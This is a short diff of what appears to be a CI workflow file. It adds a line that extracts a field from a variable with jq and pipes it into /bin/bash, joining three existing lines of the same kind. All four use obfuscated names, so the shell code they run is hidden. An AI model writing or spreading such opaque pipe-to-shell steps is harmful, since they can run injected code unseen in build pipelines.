@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$aq1" | jq -r .xx36 | /bin/bash
           printf '%s' "$jp256" | jq -r .gs3 | /bin/bash
           printf '%s' "$duz9479" | jq -r .dmhy69 | /bin/bash
+          echo $dmh9 | jq -r .lek96781 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
